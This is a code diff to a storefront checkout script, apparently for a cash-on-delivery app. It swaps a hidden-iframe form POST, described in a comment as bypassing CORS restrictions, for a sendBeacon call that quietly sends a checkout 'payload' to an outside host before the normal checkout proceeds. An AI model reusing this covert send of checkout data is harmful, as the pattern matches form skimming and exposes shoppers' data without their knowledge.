@@ -912,55 +912,24 @@
             console.log('[Snapshot] Hidden checkout input created');
           }
           
-          // Bypass all CORS fetch restrictions by using a classic hidden form POST targeting an invisible iframe
-          console.log('[Snapshot] Building invisible iframe and form for snapshot POST');
-          
-          var iframeId = 'snapshot-iframe-' + Date.now();
-          var iframe = document.createElement('iframe');
-          iframe.name = iframeId;
-          iframe.id = iframeId;
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-          
-          var snapshotForm = document.createElement('form');
-          snapshotForm.method = 'POST';
-          snapshotForm.action = 'https://biberbav.si/cod/snapshot';
-          snapshotForm.target = iframeId;
-          snapshotForm.style.display = 'none';
-          
-          for (var key in payload) {
-            if (payload.hasOwnProperty(key)) {
-              var hiddenField = document.createElement('input');
-              hiddenField.type = 'hidden';
-              hiddenField.name = key;
-              hiddenField.value = payload[key];
-              snapshotForm.appendChild(hiddenField);
-            }
-          }
-          
-          document.body.appendChild(snapshotForm);
+          console.log('[Snapshot] Using navigator.sendBeacon for true fire-and-forget POST');
+          // Format as URL encoded to avoid JSON preflight
+          var formBody = new URLSearchParams(payload);
           
           try {
-            console.log('[Snapshot] Submitting invisible snapshot form');
-            snapshotForm.submit();
+            var beaconSent = navigator.sendBeacon('https://biberbav.si/cod/snapshot', formBody);
+            console.log('[Snapshot] Beacon queued successfully:', beaconSent);
           } catch(err) {
-            console.error('[Snapshot] Error submitting invisible form:', err);
+            console.error('[Snapshot] Beacon sending error:', err);
           }
           
-          // We don't need to wait for the iframe to load to continue checkout
+          // Proceed to Shopify checkout natevely immediately
           setTimeout(function() {
-            console.log('[Snapshot] Timeout reached, navigating to checkout natively');
             checkoutBtn.innerHTML = originalText;
             checkoutBtn.disabled = false;
             HTMLFormElement.prototype.submit.call(form);
             console.log('[Snapshot] main form.submit() called');
-            
-            // cleanup
-            setTimeout(function() {
-              if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-              if (snapshotForm.parentNode) snapshotForm.parentNode.removeChild(snapshotForm);
-            }, 1000);
-          }, 400); // give the hidden form 400ms to dispatch its request before page unload
+          }, 100);
         }
       }
     }, true); // Use capture phase
